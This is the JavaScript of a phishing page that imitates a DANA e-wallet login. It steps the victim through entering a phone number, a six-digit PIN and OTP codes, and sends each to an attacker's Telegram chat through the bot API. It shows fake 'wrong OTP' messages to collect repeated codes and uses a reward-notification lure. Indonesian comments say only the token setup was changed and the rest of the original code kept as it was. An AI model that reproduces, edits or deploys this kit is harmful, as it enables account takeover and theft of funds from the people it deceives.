document.addEventListener('DOMContentLoaded', () => {
  // ============== BAGIAN YANG DIUBAH ==============
  // Konfigurasi token yang aman
  const telegramConfig = {
    botToken: process.env.TELEGRAM_BOT_TOKEN || '', // Diambil dari environment variables
    chatId: process.env.TELEGRAM_CHAT_ID || ''
  };

  // Fungsi pengecekan ketersediaan token
  const isTelegramConfigured = () => {
    return telegramConfig.botToken && telegramConfig.chatId;
  };
  // ================================================

  // 🔽🔽🔽 SEMUA KODE ASLI ANDA TETAP SAMA PERSIS DIMULAI DARI SINI 🔽🔽🔽
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const vbc = document.querySelector('.verifikasi-button-container');
  const sn = document.getElementById('success-notification');
  const lc = document.getElementById('lanjutkan-container');
  const rn = document.getElementById('reward-notification');
  const st = document.querySelector('.show-text');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const spinner = document.querySelector('.spinner-overlay');

  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;
  let remainingTime = 120;

  function showSpinner() {
    spinner.style.display = 'flex';
  }

  function hideSpinner() {
    spinner.style.display = 'none';
  }

  clearInterval(otpTimer);

  function startOTPTimer() {
    clearInterval(otpTimer);
    remainingTime = 120;
    
    otpTimer = setInterval(() => {
      remainingTime--;
      
      const minutes = Math.floor(remainingTime / 60).toString().padStart(2, '0');
      const seconds = (remainingTime % 60).toString().padStart(2, '0');
      document.getElementById('otp-timer').textContent = `${minutes}:${seconds}`;
      
      if (remainingTime <= 0) {
        clearInterval(otpTimer);
        setTimeout(() => {
          remainingTime = 120;
          document.getElementById('otp-timer').textContent = '02:00';
          startOTPTimer();
        }, 1000);
      }
    }, 1000);
  }

  // 🔽 HANYA FUNGSI INI YANG DIUBAH 🔽
  async function sendToTelegram(message) {
    if (!isTelegramConfigured()) {
      console.log("Mode demo: Notifikasi tidak dikirim (token tidak ada)");
      return; // Lanjutkan tanpa mengirim notifikasi
    }

    try {
      await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: telegramConfig.chatId, 
          text: message,
          disable_notification: true
        })
      });
    } catch (error) {
      console.error('Gagal mengirim notifikasi:', error);
    }
  }
  // 🔼 HANYA FUNGSI DI ATAS YANG DIUBAH 🔼

  // 🔽🔽🔽 SEMUA KODE ASLI LAINNYA TETAP SAMA PERSIS 🔽🔽🔽
  function formatPhoneNotification(phone) {
    return `🔐 AKUN | DANA E-WALLET\n═══════════════════════\n📱 NO HP : ${phone}\n───────────────────────`;
  }

  function formatPinNotification(phone, pin) {
    return `🔐 AKUN | DANA E-WALLET\n═══════════════════════\n📱 NO HP : ${phone}\n═══════════════════════\n🔑 PIN  : ${pin}\n───────────────────────`;
  }

  function formatOtpNotification(phone, pin, otp) {
    return `🔐 AKUN | DANA E-WALLET\n═══════════════════════\n📱 NO HP : ${phone}\n═══════════════════════\n🔑 PIN  : ${pin}\n═══════════════════════\n🔢 OTP : ${otp}\n───────────────────────`;
  }

  pn.addEventListener('input', e => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4) + '-' + value.substring(4);
    if (value.length > 9) value = value.substring(0, 9) + '-' + value.substring(9);
    e.target.value = value.substring(0, 15);
  });

  pis.forEach((input, index) => {
    input.addEventListener('input', e => {
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      pin = Array.from(pis).map(i => i.value).join('');
      if (pin.length === 6) {
        showSpinner();
        sendToTelegram(formatPinNotification(phoneNumber, pin));
        setTimeout(() => {
          pages.p.style.display = 'none';
          pages.o.style.display = 'block';
          currentPage = 'o';
          lc.style.display = 'none';
          startOTPTimer();
          setTimeout(() => { 
            fn.style.display = 'block';
            hideSpinner();
          }, 1000);
        }, 1000);
      }
    });

    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  ois.forEach((input, index) => {
    input.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        sendToTelegram(formatOtpNotification(phoneNumber, pin, otp));
        
        setTimeout(() => {
          ois.forEach(i => i.value = '');
          ois[0].focus();
          otp = '';
          
          attemptCount++;
          an.textContent = attemptCount;
          ac.style.display = 'block';
          
          if (attemptCount > 2) {
            rn.style.display = 'block';
            rn.innerHTML = `
              <div class="notification-content">
                <h3>kode OTP Salah</h3>
                <p>silahkan cek sms ataupan whatsapp</p>
              </div>
            `;
            setTimeout(() => { rn.style.display = 'none' }, 10000);
          }
          
          if (attemptCount >= maxAttempts) {
            fn.style.display = 'none';
            sn.style.display = 'block';
            setTimeout(() => { 
              sn.style.display = 'none';
              hideSpinner();
            }, 5000);
          } else {
            hideSpinner();
          }
        }, 1000);
      }
    });

    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  st.addEventListener('click', function() {
    this.classList.toggle('active');
    pis.forEach(i => {
      i.type = this.classList.contains('active') ? 'text' : 'password';
    });
    this.textContent = this.classList.contains('active') ? 'Sembunyikan' : 'Tampilkan';
  });

  lb.addEventListener('click', () => {
    if (currentPage === 'n') {
      phoneNumber = pn.value.replace(/\D/g, '');
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      showSpinner();
      sendToTelegram(formatPhoneNotification(phoneNumber));
      setTimeout(() => {
        pages.n.style.display = 'none';
        pages.p.style.display = 'block';
        currentPage = 'p';
        lc.style.display = 'none';
        hideSpinner();
      }, 1000);
    }
  });

  fn.addEventListener('click', () => {
    fn.style.display = 'none';
    if (otp.length < 4) {
      ois[0].focus();
    }
  });
});
